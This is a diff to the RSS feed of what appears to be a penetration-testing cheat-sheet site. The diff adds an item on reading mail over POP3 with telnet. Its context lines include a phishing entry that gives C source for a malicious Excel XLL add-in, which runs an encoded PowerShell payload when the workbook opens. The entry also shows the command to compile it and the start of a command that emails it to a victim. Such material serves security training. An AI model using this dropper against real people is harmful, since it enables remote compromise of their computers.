@@ -14,5 +14,12 @@
       <guid>https://tldrbins.github.io/phishing/</guid>
       <description>Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to &amp;#34;victim@victim.</description>
     </item>
+    <item>
+      <title>POP3</title>
+      <link>https://tldrbins.github.io/pop3/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pop3/</guid>
+      <description> POP3 # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER user PASS password # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
+    </item>
   </channel>
 </rss>
